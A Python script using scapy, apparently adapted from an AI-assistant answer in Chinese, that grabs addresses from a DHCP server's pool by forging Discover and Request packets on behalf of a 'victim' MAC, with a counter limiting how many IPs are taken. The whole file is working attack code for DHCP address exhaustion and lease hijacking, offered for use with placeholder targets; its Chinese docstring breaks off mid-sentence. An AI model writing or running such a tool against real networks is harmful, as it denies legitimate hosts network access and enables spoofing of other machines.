#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

"""
如果您希望脚本能够控制抢占的数量，可以将抢占DHCP地址池的逻辑放在一个循环中，并在循环中控制抢占的数量。
具体实现时，可以定义一个变量counter来记录已经抢占的数量，并在每次循环中判断counter是否达到抢占数量的上限。
如果达到，则停止循环，否则继续抢占下一个IP地址。代码如下：

在上述代码中，我们定义了一个变量num_to_grab来表示需要抢占的IP地址数量，然后在循环中添加了对counter的判断。
如果counter达到了num_to_grab，程序将使用break语句跳出循环，终止
"""

from scapy.all import *

# 目标IP地址、MAC地址、网卡名和DHCP服务器IP地址
victim_ips = ["TARGET_IP_1", "TARGET_IP_2", "TARGET_IP_3"]
victim_mac = "TARGET_MAC"
iface = "INTERFACE_NAME"
dhcp_server = "SERVER_IP"

# 定义需要抢占的IP数量
num_to_grab = 2

# 记录已经抢占的IP数量
counter = 0

for victim_ip in victim_ips:
    # 如果已经抢占了足够的IP数量，则终止循环
    if counter >= num_to_grab:
        break

    # 构造DHCP Discover包，并将其发送到目标IP地址
    discover_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                   IP(src="0.0.0.0", dst="255.255.255.255") / \
                   UDP(sport=68, dport=67) / \
                   BOOTP(chaddr=RandMAC(), xid=RandInt()) / \
                   DHCP(options=[("message-type", "discover"),
                                 "end"])
    sendp(discover_pkt, iface=iface)

    # 抓取DHCP Offer包，并提取出其中的相关信息
    offer_pkt = sniff(filter="udp and port 67 and port 68 and src " + dhcp_server, count=1)[0]
    offer_ip = offer_pkt.getlayer(BOOTP).yiaddr
    transaction_id = offer_pkt.getlayer(BOOTP).xid
    server_ip = offer_pkt.getlayer(IP).src

    # 构造DHCP Request包，并将其发送到DHCP服务器，请求使用offer_ip地址
    request_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(chaddr=victim_mac, xid=transaction_id) / \
                  DHCP(options=[("message-type", "request"),
                                ("server_id", server_ip),
                                ("requested_addr", offer_ip),
                                "end"])
    sendp(request_pkt, iface=iface)

    # 抓取DHCP ACK包，并打印提示信息
    ack_pkt = sniff(filter="udp and port 67 and port 68 and src " + dhcp_server, count=1)
    if ack_pkt and ack_pkt[0].getlayer(DHCP).options[0][1] == 5:
        print("IP address %s has been successfully grabbed." % offer_ip)

    # 已抢占数量加一
    counter += 1
